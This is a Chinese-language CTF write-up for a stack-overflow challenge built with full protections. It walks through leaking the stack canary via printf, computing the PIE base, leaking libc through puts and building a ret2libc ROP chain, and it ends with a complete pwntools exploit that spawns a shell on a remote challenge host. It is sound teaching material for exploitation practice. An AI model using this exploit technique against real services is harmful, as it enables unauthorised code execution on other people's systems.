---
title: "栈溢出全防 chall —— PWN Writeup"
pubDatetime: 2026-03-28T13:00:00+08:00
tags:
  - pwn
  - 栈溢出
  - Canary
  - PIE
  - ret2libc
description: "一道开满保护（FullRELRO / Canary / NX / PIE）的栈溢出题：从泄露 Canary、爆破真实基址、计算 PIE 偏移，到 ret2libc 最终 getshell 的完整 Writeup。"
featured: true
---

## 0x00 程序分析

首先不要着急的拿到ida里面去看，而是先看看保护和是什么程序

```shell
file ./chall
./chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=47348e907e6bd456810c6015278d5e43110c8318, for GNU/Linux 3.2.0, not stripped
```

```shell
checksec --file=./chall
RELRO  STACK  CANARY  NX  PIE  RPATH  RUNPATH
FullRELRO  Canaryfound  NXenabled  PIEenabled  NoRPATH  NoRUNPATH

Symbols  FORTIFY  Fortified  Fortifiable  FILE
76Symbols  No         0          3       ./chall
```

可以看到保护全开，且是64位二进制程序

放入ida进去查看

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0); #关闭标准输出的缓冲
  while ( puts("Do you want to complete a survey?") && getchar() == 121 )
  {
    getchar();
    getFeedback();
  }
  return 0;
}
```

可以看到，`main` 函数的逻辑非常简单。主要是一个 `while` 循环，只要我们输入 `'y'`（对应 ASCII 码 121），程序就会不断调用核心函数 `getFeedback()`

对于一道保护全开的题目来说，这个循环是极其关键的**突破口**。通常栈溢出只有一次劫持控制流的机会，但这个 `while` 循环相当于给了我们一个非常有用的机会，只要我们在每一次利用漏洞时，小心地将破坏的栈结构恢复原状，程序就不会崩溃，这意味着我们可以无数次试错找到解法

那么我们先去看看`getFeedback()`里面长什么样子

```c
unsigned __int64 getFeedback()
{
  __int64 buf; // [rsp+Eh] [rbp-12h] BYREF
  __int16 v2; // [rsp+16h] [rbp-Ah]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u); #取出 Canary 放入 v3
  buf = 0;
  v2 = 0;
  puts("Do you like ctf?");
  read(0, &buf, 0x1Eu);
  printf("You said: %s\n", (const char *)&buf);
  if ( (_BYTE)buf == 121 )
    printf("That's great! ");
  else
    printf("Aww :( ");
  puts("Can you provide some extra feedback?");
  read(0, &buf, 0x5Au);
  return __readfsqword(0x28u) ^ v3;
}
```

出题人非常良心的给我们留了漏洞

## 0x01 利用思路

在函数的开头，程序从系统的特殊寄存器里取出了一个随机数放到 `v3`，这就是`Canary`，观察ida贴心标注的相对地址，我们便可以得到如下提示

- 输入起点`buf`位于 `rbp-0x12`
- `Canary`位于`rbp-0x8`
- 经过简单的减法`0x12 - 0x8 = 0xA`，就是说，我们输入的`buf`只要超过10 个字节，就会触碰到 `Canary`

我们继续往下看

这是程序给我们的第一次输入机会

- `read` 函数允许我们输入`0x1E`（即30 字节），这远远超出了`buf`到`Canary`的 10 字节
- 因为接下来的`printf`使用了 `%s` 格式化打印。`%s`的特性是遇到`\x00`截断，也就是一直打印直到遇到截断符为止
- Canary 的最低位永远固定为`\x00`。我们利用这 30 字节的额度，输入11 个字节，前10个字节填满安全区，第 11 个字节覆盖掉了 Canary 最低位的`\x00`。这样一来，`printf`在打印完我们的输入后无法停止，顺理成章地将 Canary 剩余的高 7 位字节一并打印了出来！

这是第二次输入机会

- 这一次的`read`更加离谱，允许读入`0x5A`（即 90 字节）。
- 90 字节的空间，足够我们干很多事了。我们可以在这里构造一条完整的 ROP 链（`填充 + 伪造Canary + 覆盖RBP + 劫持RIP + 各种Gadgets`）。
- 最后一行`return`前的那个异或`^ v3`如果我们刚才破坏了 Canary 不管它，程序立刻就会在这个检查点崩溃（`stack smashing detected`）。因此，在这个 90 字节的输入里，我们必须将刚才泄露并还原的真实的 Canary 原封不动地写回到`rbp-0x8`的位置

综上所述，结合前面的分析，思路有了

- 第一步：泄露 Canary
- 第二步：泄露返回地址，计算 PIE 基址
- 第三步：构造初级 ROP 链，泄露 Libc 基址
- 第四步：构造最后的 ROP 链，拿 Shell

## 0x02 构造

终于到了实操的部分了，前面写的要累死了

前面已经说过canary的泄露原理，因此这里不再复述，我们得把重心放到pie和libc上，当然为了避免重复操作，我们先定义两个函数，

第一个叫做`trigger_first_read`对应`main`函数，为了进入循环，并触发第一次`read`

第二个叫做`trigger_second_read`对应刚刚分析的`getFeedback()`，这个是为了触发第二次`read`

```python
def trigger_first_read(payload):
    p.recvuntil(b"Do you want to complete a survey?\n")
    p.sendline(b'y')
    p.recvuntil(b"Do you like ctf?\n")
    p.send(payload)

def trigger_second_read(payload):
    p.recvuntil(b"Can you provide some extra feedback?\n")
    p.send(payload)
```

然后开始泄露canary

```python
#填满 10 字节 buf，外加 1 字节 'B' 覆盖 Canary 的 \x00 截断符
trigger_first_read(flat(b'A' * 10, b'B'))

#接收并还原 Canary
p.recvuntil(b'B')
canary_leak = p.recv(7)
canary = u64(b'\x00' + canary_leak)
log.success(f"Canary leak: {hex(canary)}")

#填回Canary，进入下一循环
trigger_second_read(flat(b'A' * 10, canary))
```

拿到canary，写这个只是演示，每一次启动程序canary都会变

```python
[+] Canary leak: 0x638b37b85326d600
```

ok，拿下，现在是重中之重的东西了，如何绕过pie，毕竟函数地址在天上乱飘

那问题来了，怎么算呢，怎么泄露呢，怎么溢出呢

在pie保护下，程序的返回地址是随机变化的，一般情况下，我也不知道还有什么方法拿到

但多亏出题人留的printf漏洞啊，只要把中间给全部给夺舍了，最后不就有pie返回地址了吗

如果有了偏移量，pie基址就有了，然后万物之始就有了

那怎么看偏移量啊

当然是靠 ~~ida~~ pwndbg了

![pwndbg 下断点](/assets/images/stack-full-protection/pwndbg-breakpoint.png)

首先下断点

第二步，找真实基址

![找真实基址](/assets/images/stack-full-protection/find-base.png)

排在第一行，权限是`r--p`的这个`chall`，它的起始地址是`0x555555554000`

第三步，在栈上找真实返回地址

![在栈上找真实返回地址](/assets/images/stack-full-protection/find-ret-addr.png)

秒了

![计算 PIE 基址](/assets/images/stack-full-protection/pie-leak.png)

pie固定偏移量是0x1447

泄露出来的地址 - pie固定偏移量 0x1447 = 服务器当前的真实基址

不过由于每次泄露地址会变，所以我们还是需要正常泄露，不过有了偏移量了，那就等于不存在随机地址了

so，开始吧

```python
#填满 buf(10) + 覆盖截断符(1) + 真实Canary的高7位 + 覆盖RBP(8)
trigger_first_read(flat(b'A' * 10, b'B', canary_leak, b'C' * 8))

# 接收并计算 PIE 基址
p.recvuntil(b'C' * 8)
pie_leak = u64(p.recv(6).ljust(8, b'\x00'))
pie_base = pie_leak - 0x1447 #秒了秒了

log.success(f"PIE leak: {hex(pie_leak)}")
log.success(f"PIE Base: {hex(pie_base)}")
```

```python
[+] PIE leak: 0x5b570f58f447
[+] PIE Base: 0x5b570f58e000
```

好了，家门口被我翘了

激动人心，最后记得把canary放进去，进入下一次循环吧，也就是libc泄露

虽然我们拿到了`chall`程序内部的所有地址，但`system("/bin/sh")`这种东西通常藏在系统的 `libc.so.6`库里，Libc在内存中的位置同样是随机的，所以我们需要利用 ROP 链进行第三次泄露

在此之前我们得知道这个3个东西

| **名称**       | **为什么要它？**                                             |
| :------------- | :----------------------------------------------------------- |
| `pop_rdi`      | 负责把“目标地址”塞给 CPU，让 CPU 知道下一步要打印谁          |
| **`puts_got`** | GOT 表里存的是 `puts` 函数在系统 Libc 里的**真实物理地址**   |
| **`puts_plt`** | 程序自带的打印函数入口。调用它，它就会把 RDI 里的东西印在屏幕上 |

在 64 位 Linux 程序中，函数调用的规则很死板：如果你想调用`puts`，你不能直接把参数压在栈上，你必须把参数放在`RDI`寄存器里

所以我们需要一个神奇的东西ROPgadget，这样就有这个神奇的相对偏移量了，加上之前的pie基址，就等于有了这个的地址了

![ROPgadget 查找 pop rdi](/assets/images/stack-full-protection/ropgadget.png)

so，如下

```python
pop_rdi = pie_base + 0x14d3
puts_got = pie_base + elf.got['puts']
puts_plt = pie_base + elf.plt['puts']
```

拿到这些地址能干吗，对呀，能干吗呢，当然是泄露libc地址了

```python
rop1 = flat(
    b'A' * 10,      #1. 填满buf
    canary,         #2. 填入Canary过检测
    b'E' * 8,       #3. 覆盖RBP
    pop_rdi,        #4. Gadget:准备给 rdi 传参
    puts_got,       #5. 参数:要打印的目标地址 (puts 的真实物理地址)
    puts_plt,       #6. 调用puts
    main_addr       #7. 执行完puts后，让程序重新跑回 main 函数
)
trigger_second_read(rop1)

leak_data = p.recvline().strip() #抓取打印出的一整行并去掉末尾换行符
puts_leak = u64(leak_data.ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts'] #计算基址
log.success(f"Libc Base: {hex(libc.address)}")
```

```python
[+] Libc Base: 0x7ecce0c00000
```

拿下

最后一步，有了libc能做什么呢

Linux 的系统标准库能做什么啊

~~你想做什么做什么~~

拿到shell了

后面正常流程了，当然在此之前要记得不要忘了ret

![ret 栈对齐](/assets/images/stack-full-protection/ret-gadget.png)

为了应对栈对齐要求

为啥要对齐，因为我靶机是ubuntu，而ubuntu要16字节栈对齐

`ret` 的动作是从栈上弹出一个地址并跳过去。

这会让栈顶指针往后挪8个字节，8（rop链是由一个个 8 字节（64位）的地址）+8=16，对齐了

```python
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
ret_gadget = pie_base + 0x101a
```

这个有了，那个也有了，直接构造

```python
rop2 = flat(
    b'A' * 10,
    canary,
    b'E' * 8,
    ret_gadget,
    pop_rdi,
    binsh_addr,
    system_addr
)
```

拿下

![成功 getshell](/assets/images/stack-full-protection/getshell.png)

最终exp，如下

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('./chall')
libc = ELF('./libc.so.6')
p = remote("47.107.148.41", 9999)

def trigger_first_read(payload):
    p.recvuntil(b"Do you want to complete a survey?\n")
    p.sendline(b'y')
    p.recvuntil(b"Do you like ctf?\n")
    p.send(payload)
def trigger_second_read(payload):
    p.recvuntil(b"Can you provide some extra feedback?\n")
    p.send(payload)


trigger_first_read(flat(b'A' * 10, b'B'))
p.recvuntil(b'B')
canary_leak = p.recv(7)
canary = u64(b'\x00' + canary_leak)
log.success(f"Canary leak: {hex(canary)}")

trigger_second_read(flat(b'A' * 10, canary))
trigger_first_read(flat(b'A' * 10, b'B', canary_leak, b'C' * 8))
p.recvuntil(b'C' * 8)
pie_leak = u64(p.recv(6).ljust(8, b'\x00'))
pie_base = pie_leak - 0x1447

log.success(f"PIE leak (Return Address): {hex(pie_leak)}")
log.success(f"PIE Base: {hex(pie_base)}")


trigger_second_read(flat(b'A' * 10, canary, b'D' * 8))
pop_rdi = pie_base + 0x14d3
puts_got = pie_base + elf.got['puts']
puts_plt = pie_base + elf.plt['puts']
main_addr = pie_base + elf.symbols['main']
trigger_first_read(b'A\n')

rop1 = flat(
    b'A' * 10,
    canary,
    b'E' * 8,
    pop_rdi,
    puts_got,
    puts_plt, 
    main_addr 
)

trigger_second_read(rop1)
leak_data = p.recvline().strip()
puts_leak = u64(leak_data.ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

log.success(f"Libc Base: {hex(libc.address)}")


system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
ret_gadget = pie_base + 0x101a
trigger_first_read(b'A\n')

rop2 = flat(
    b'A' * 10,
    canary,
    b'E' * 8,
    ret_gadget,
    pop_rdi,
    binsh_addr,
    system_addr
)

trigger_second_read(rop2)

p.interactive()
```
